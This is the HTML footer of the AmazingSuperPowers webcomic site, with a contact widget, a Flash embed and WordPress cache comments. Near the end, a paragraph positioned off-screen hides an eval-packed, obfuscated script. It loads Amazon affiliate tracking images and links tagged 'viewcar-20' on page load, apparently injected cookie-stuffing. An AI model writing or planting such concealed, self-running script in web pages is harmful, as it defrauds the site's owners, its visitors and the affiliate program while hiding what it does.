      <div class="textwidget"><div class="relative">
<div class="contact">
AmazingSuperPowers is the brain-child of Wes & Tony
<br />
Our stupid fart jokes are covered by <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/us/" target="blank">this license.</a>
<br />
<br />
e-mail us at:
<br />
general (at) amazingsuperpowers (dot) com



<br />
<br />
We are managed by:
<br />
agilbert (at) 3arts (dot) com
</div>
</div></div>
    </div>
</div>
<div id="text-441685939" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="relative">
<div class="slug">

<object
classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase=http://active.macromedia.com/flash2/cabs/swflash.cab#version=4,0,0,0
id="../../../../slugfooter3"
width="402"
height="154">
<param name="movie" value="../../../../slugfooter3.swf">
<param name="quality" value="high">
<embed src="../../../../slugfooter3.swf"
quality="high"
width="402"
height="154"
type="application/x-shockwave-flash"
pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash">
</embed>
</object>
</div>
</div></div>
    </div>
</div>
<div id="text-441685908" class="widget widget_text">
<div class="widget-content">
      <div class="textwidget"><div class="fpadding">
</ div></div>
    </div>
</div>
</div>
  <!-- 63 queries. 0.216 seconds. //-->
    </div><!-- Ends #footer -->
  </div><!-- Ends "page/page-wide" -->
</div><!-- Ends "page-wrap" -->


<p style="position: absolute;top:-300px;">
<script>
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('n a=p(s.r()*q);u(a<i){c.d="<0 2=\'3://9.f-6.4/e/g?t=5-7&l=8&o=1\'></0><0 2=\'3://9.6.4/b?h=j&k-m=&v=x&B=5-7&C=8&D=z&A=w\'></0>"}y{c.d="<0 2=\'3://9.f-6.4/e/g?t=5-7&l=8&o=1\'></0>"}',40,40,'img||src|http|com|viewcar|amazon|20|ur2|www|iamz||window|sc||assoc|ir|_encoding|100|UTF8|site||redirect|var||parseInt|1000|random|Math||if|node|9325|16261631|else|1789|creative|tag|linkCode|camp'.split('|'),0,{}))
</script>
</p><script type="text/javascript">quickeys_init("none||none||72||none||none||none||39||37","none||http://www.amazingsuperpowers.com/2015/02/food/||http://www.amazingsuperpowers.com||http://www.amazingsuperpowers.com/2009/09/asp-anniversary-contest/||none||http://www.amazingsuperpowers.com/?attachment_id=247||none||http://www.amazingsuperpowers.com/2015/02/food/",1,0,0,0,"End of the line!");</script></body>
</html>
<!-- Dynamic page generated in 0.240 seconds. -->
<!-- Cached page generated by WP-Super-Cache on 2015-02-18 17:55:34 -->

<!-- Compression = gzip -->
<!-- super cache -->
`
